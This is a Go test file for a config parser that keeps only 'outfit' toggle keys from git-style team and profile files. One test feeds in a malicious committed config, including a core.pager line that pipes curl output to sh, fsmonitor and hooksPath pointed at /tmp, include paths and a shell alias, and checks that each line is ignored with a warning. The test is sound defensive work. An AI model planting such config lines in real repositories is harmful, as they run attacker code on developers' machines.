package config

import (
	"reflect"
	"strings"
	"testing"
)

func parse(t *testing.T, kind Kind, text string) *File {
	t.Helper()
	return ParseFile(strings.NewReader(text), "test.cfg", kind)
}

func TestParseAcceptsOutfitKeys(t *testing.T) {
	f := parse(t, KindTeam, `
# a comment
; another
[outfit]
    biome = on
    Tests = "off"   # trailing comment
    empty =
    bare
    hook.pre-commit = off
    path = "a \"quoted\" \\ value"
    joined = one \
two
[outfit "hook"]
    pre-push = on
[OUTFIT] shout = yes
`)
	want := map[string]string{
		"biome": "on", "tests": "off", "empty": "", "bare": "true",
		"hook.pre-commit": "off", "path": `a "quoted" \ value`, "joined": "one two",
		"hook.pre-push": "on", "shout": "yes",
	}
	if !reflect.DeepEqual(f.Keys, want) {
		t.Fatalf("keys = %#v\nwant   %#v\nwarnings: %v", f.Keys, want, f.Warnings)
	}
	if len(f.Warnings) != 0 {
		t.Fatalf("unexpected warnings: %v", f.Warnings)
	}
}

func TestLockedIsUnionOfLinesAndOnlyInTeamFile(t *testing.T) {
	f := parse(t, KindTeam, "[outfit]\n locked = secrets-scan, hook.pre-push\n locked = Biome tests\n")
	want := []string{"secrets-scan", "hook.pre-push", "biome", "tests"}
	if !reflect.DeepEqual(f.Locked, want) {
		t.Fatalf("locked = %v, want %v", f.Locked, want)
	}
	if _, ok := f.Keys["locked"]; ok {
		t.Fatal("locked must not become a toggle")
	}
	p := parse(t, KindProfile, "[outfit]\n locked = biome\n biome = off\n")
	if len(p.Locked) != 0 || len(p.Warnings) != 1 || p.Keys["biome"] != "off" {
		t.Fatalf("profile.config must ignore locked with a warning: %+v", p)
	}
}

func TestProfileKeyIsNeverAccepted(t *testing.T) {
	for _, k := range []Kind{KindTeam, KindProfile} {
		f := parse(t, k, "[outfit]\n profile = yolo\n biome = on\n")
		if _, ok := f.Keys["profile"]; ok || f.Keys["biome"] != "on" {
			t.Fatalf("kind %v: keys = %v", k, f.Keys)
		}
		if len(f.Warnings) != 1 || !strings.Contains(f.Warnings[0].Message, "profile") || f.Warnings[0].Line != 2 {
			t.Fatalf("kind %v: warnings = %v", k, f.Warnings)
		}
	}
}

// HANDOVER.md scenario 12: a malicious committed config. Nothing but outfit.*
// keys may survive, and every ignored line is reported with its line number.
func TestMaliciousConfigIsIgnoredWithWarnings(t *testing.T) {
	text := `[core]
	fsmonitor = /tmp/pwn
	pager = sh -c 'curl evil | sh'
	hooksPath = /tmp/evil
[include]
	path = /tmp/evil.cfg
[includeIf "gitdir:/"]
	path = /tmp/evil.cfg
[alias]
	x = !sh
[Core]
	editor = evil
[outfit]
	biome = on
[outfit "evil"]
	x = y
[safe]
	directory = *
`
	f := parse(t, KindTeam, text)
	if !reflect.DeepEqual(f.Keys, map[string]string{"biome": "on"}) {
		t.Fatalf("only outfit.biome may survive: %v", f.Keys)
	}
	if len(f.Locked) != 0 {
		t.Fatal("nothing may be locked by a malicious file")
	}
	for _, needle := range []string{"core.fsmonitor", "core.pager", "core.hookspath", "include.path", "alias.x", "safe.directory", `[includeif "gitdir:/"]`} {
		found := false
		for _, w := range f.Warnings {
			if strings.Contains(strings.ToLower(w.Message), needle) {
				found = true
			}
		}
		if !found {
			t.Errorf("no warning mentions %q: %v", needle, f.Warnings)
		}
	}
	for _, w := range f.Warnings {
		if w.Line == 0 {
			t.Errorf("warning without a line number: %v", w)
		}
	}
}

func TestMalformedLinesAreSkippedNotFatal(t *testing.T) {
	f := parse(t, KindTeam, `key = before any section
[outfit
	a = 1
[outfit]
	b = "unterminated
	c = ok
	d = bad \q escape
	= novalue
	9bad = x
	e == f
	Weird_Key = x
	f = fine
`)
	if !reflect.DeepEqual(f.Keys, map[string]string{"c": "ok", "f": "fine", "e": "= f"}) {
		t.Fatalf("keys = %v\nwarnings = %v", f.Keys, f.Warnings)
	}
	if len(f.Warnings) < 6 {
		t.Fatalf("every bad line must warn: %v", f.Warnings)
	}
}

func TestOversizedFileIsIgnored(t *testing.T) {
	f := parse(t, KindTeam, "[outfit]\n"+strings.Repeat("# padding\n", MaxFileSize/8)+"biome = off\n")
	if len(f.Keys) != 0 || len(f.Warnings) != 1 {
		t.Fatalf("keys=%v warnings=%v", f.Keys, f.Warnings)
	}
}

// Whatever the input, only well-formed toggle keys can come out.
func TestOnlyWellFormedKeysEverSurvive(t *testing.T) {
	inputs := []string{
		"[outfit]\n\x00 = 1\n", "[outfit]\n..a = 1\n", "[outfit]\nhook. = 1\n", "[outfit]\nhook.a.b = 1\n",
		"[outfit \"hook\"]\n.x = 1\n", "[outfit \"hook\"]\nA B = 1\n", "[\n", "[]\n", "]\n", "[outfit]]\n",
		"[outfit \"hook\" ]\nx=1\n", "[outfit]\nlocked = ../../etc, a b, hook.x\n", "\xff\xfe[outfit]\na=1",
	}
	for _, in := range inputs {
		f := parse(t, KindTeam, in)
		for k := range f.Keys {
			if _, err := NormalizeKey(k); err != nil || k != strings.ToLower(k) {
				t.Errorf("input %q produced invalid key %q", in, k)
			}
		}
		for _, k := range f.Locked {
			if _, err := NormalizeKey(k); err != nil {
				t.Errorf("input %q produced invalid locked key %q", in, k)
			}
		}
	}
}

func TestNormalizeKey(t *testing.T) {
	good := map[string]string{"biome": "biome", " Biome ": "biome", "hook.pre-commit": "hook.pre-commit", "a1-b": "a1-b"}
	for in, want := range good {
		if got, err := NormalizeKey(in); err != nil || got != want {
			t.Errorf("NormalizeKey(%q) = %q, %v", in, got, err)
		}
	}
	for _, bad := range []string{"", "1a", "-a", "a b", "a.b", "hook.", "hook.a.b", "a/b", "a=b", "../x", "a_b"} {
		if _, err := NormalizeKey(bad); err == nil {
			t.Errorf("NormalizeKey(%q) must fail", bad)
		}
	}
}
